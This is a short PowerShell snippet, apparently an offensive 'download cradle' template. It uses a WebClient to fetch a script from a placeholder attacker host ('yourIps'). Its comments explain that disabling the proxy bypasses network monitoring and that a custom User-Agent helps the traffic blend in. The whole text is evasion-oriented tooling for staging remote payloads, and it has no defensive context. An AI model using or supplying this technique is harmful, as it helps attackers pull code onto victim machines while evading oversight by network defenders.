$wc = new-object system.net.WebClient
##Force to no using proxy to bypass any monitoring that processes network traffic at the proxy
$wc.proxy = $null
##customize user agent using the Headers181 property of the Net.WebClient object using the Add method
##The defult powershell download cradle has an empty user-agent string
$wc.Headers.Add('User-Agent', "You Can Put anything to blend in")

$wc.DownloadString("http://yourIps/yourscript.ps1")